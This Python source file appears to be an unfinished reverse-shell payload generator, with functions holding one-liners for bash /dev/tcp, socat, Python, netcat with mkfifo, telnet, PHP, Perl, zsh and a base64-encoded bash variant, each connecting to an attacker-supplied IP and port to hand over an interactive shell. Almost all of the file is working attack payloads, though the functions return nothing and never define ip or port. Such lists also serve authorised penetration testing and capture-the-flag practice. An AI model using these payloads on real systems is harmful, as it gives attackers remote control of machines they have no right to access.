def bash():
	bash196=f'''0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196'''
	bash_dev=f'''/bin/bash -c "/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"'''
	bash_readline=f'''exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'''
	bash5=f'''sh -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5'''
	
def socat():
	socat=f'''socat TCP:{ip}:{port} EXEC:'sh',pty,stderr,setsid,sigint,sane'''
	
def python():
	python2=f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''''
	python3=f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''''
	
def bsd():
	BSD=f'''mkfifo /tmp/lol;nc {ip} {port} 0</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol'''

def telnet():
	telnet=f'''TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | sh 1>$TF'''
	
def php():
	exec1=f'''php -r '$sock=fsockopen("{ip}",{port});exec("sh <&3 >&3 2>&3");\''''
	shell_exec=f'''php -r '$sock=fsockopen("{ip}",{port});shell_exec("sh <&3 >&3 2>&3");\''''
	system=f'''php -r '$sock=fsockopen("{ip}",{port});system("sh <&3 >&3 2>&3");\''''
	weird_qoute=f'''php -r '$sock=fsockopen("{ip}",{port});`sh <&3 >&3 2>&3`;\''''
		
def perl():
	perl=f'''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))'''+'{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};\''
	perl_no_sh=f'''perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''''
	
def zsh():
	zsh=f'''zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY\''''
	
def encoded():  # Going to add more payloads for this one
	cli=f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'".encode("utf-8")
	encoded = base64.b64encode(cli).decode('utf-8')
	cli2="bash -c '{echo,"+f"{encoded}"+"}|{base64,-d}|{bash,-i}'"

	#NodeJS   --> will be an option to use because its a special case
	#require('child_process').exec('')
